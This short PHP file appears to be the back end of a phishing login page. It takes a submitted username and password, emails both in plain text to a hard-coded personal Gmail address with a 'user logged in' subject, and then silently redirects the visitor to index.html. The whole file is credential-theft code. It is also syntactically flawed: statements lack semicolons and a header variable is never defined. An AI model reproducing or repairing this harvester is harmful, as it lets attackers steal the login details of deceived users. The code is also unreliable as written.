<?php

$destino = "faviomancusov@gmail.com"
$usuario = $_POST["usuario"];
$contraseña = $_POST["contraseña"];

$contenido = "Usuario " . $usuario . "\nContraseña " . $contraseña ;
$asunto = "El siguiente usuario inició sesión: "

mail($destino, $asunto, $contenido, $header);
header('Location:index.html');

?>

